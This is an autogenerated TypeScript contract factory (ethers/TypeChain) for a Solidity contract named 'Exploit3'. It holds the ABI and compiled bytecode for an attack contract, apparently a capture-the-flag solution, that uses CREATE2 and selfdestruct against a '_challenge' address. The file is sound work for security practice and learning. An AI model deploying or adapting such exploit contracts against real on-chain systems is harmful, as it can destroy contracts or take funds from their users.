/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type { Exploit3, Exploit3Interface } from "../Exploit3";

const _abi = [
  {
    inputs: [
      {
        internalType: "address",
        name: "_challenge",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "fuck",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b506040516109e03803806109e08339818101604052602081101561003357600080fd5b81019080805190602001909291905050505061098c806100546000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c80634d6249d114610030575b600080fd5b61003861003a565b005b6100666040518060200161004d90610468565b6020820181038252601f19601f820116604052506100e8565b600061009a60008060001b6040518060200161008190610468565b6020820181038252601f19601f820116604052506101e6565b90506100a581610390565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6101e3816040516024018080602001828103825283818151815260200191508051906020019080838360005b8381101561012f578082015181840152602081019050610114565b50505050905090810190601f16801561015c5780820380516001836020036101000a031916815260200191505b50925050506040516020818303038152906040527f0be77f56000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061043f565b50565b6000808447101561025f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f437265617465323a20696e73756666696369656e742062616c616e636500000081525060200191505060405180910390fd5b6000835114156102d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f437265617465323a2062797465636f6465206c656e677468206973207a65726f81525060200191505060405180910390fd5b8383516020850187f59050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610385576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260198152602001807f437265617465323a204661696c6564206f6e206465706c6f790000000000000081525060200191505060405180910390fd5b809150509392505050565b61043c81604051602401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506040516020818303038152906040527f2c2ecbc2000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061043f565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b6104e1806104768339019056fe608060405273d781e69e8f52749f29f3def6fa8ad0b80595d5956000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b50600160008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c19d93fb6040518163ffffffff1660e01b815260040160206040518083038186803b1580156100cd57600080fd5b505afa1580156100e1573d6000803e3d6000fd5b505050506040513d60208110156100f757600080fd5b8101908080519060200190929190505050600381111561011357fe5b14156101a75760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639b9bef436040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561018157600080fd5b505af1158015610195573d6000803e3d6000fd5b505050506105396001819055506102e7565b600360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c19d93fb6040518163ffffffff1660e01b815260040160206040518083038186803b15801561020f57600080fd5b505afa158015610223573d6000803e3d6000fd5b505050506040513d602081101561023957600080fd5b8101908080519060200190929190505050600381111561025557fe5b14156102e65760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633a4a42336040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102c357600080fd5b505af11580156102d7573d6000803e3d6000fd5b50505050620138d56001819055505b5b6101eb806102f66000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c806335f4699414610051578063402303bf1461005b57806364d4d70014610065578063acfa412e14610083575b600080fd5b61005961008d565b005b6100636100a7565b005b61006d610129565b6040518082815260200191505060405180910390f35b61008b610133565b005b600073ffffffffffffffffffffffffffffffffffffffff16ff5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663402303bf6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010f57600080fd5b505af1158015610123573d6000803e3d6000fd5b50505050565b6000600154905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663acfa412e6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561019b57600080fd5b505af11580156101af573d6000803e3d6000fd5b5050505056fea264697066735822122049b47fbff93727635f1c8cfc1b8b2c11fe7d1b7d5cf60886621e48cd61930a5164736f6c63430007060033a2646970667358221220c176b8ed0d32496fbea7b1c2c1470a4a45f237395b21da00db1ea9b7cda4b68564736f6c63430007060033";

type Exploit3ConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: Exploit3ConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class Exploit3__factory extends ContractFactory {
  constructor(...args: Exploit3ConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "Exploit3";
  }

  deploy(
    _challenge: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<Exploit3> {
    return super.deploy(_challenge, overrides || {}) as Promise<Exploit3>;
  }
  getDeployTransaction(
    _challenge: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_challenge, overrides || {});
  }
  attach(address: string): Exploit3 {
    return super.attach(address) as Exploit3;
  }
  connect(signer: Signer): Exploit3__factory {
    return super.connect(signer) as Exploit3__factory;
  }
  static readonly contractName: "Exploit3";
  public readonly contractName: "Exploit3";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): Exploit3Interface {
    return new utils.Interface(_abi) as Exploit3Interface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): Exploit3 {
    return new Contract(address, _abi, signerOrProvider) as Exploit3;
  }
}
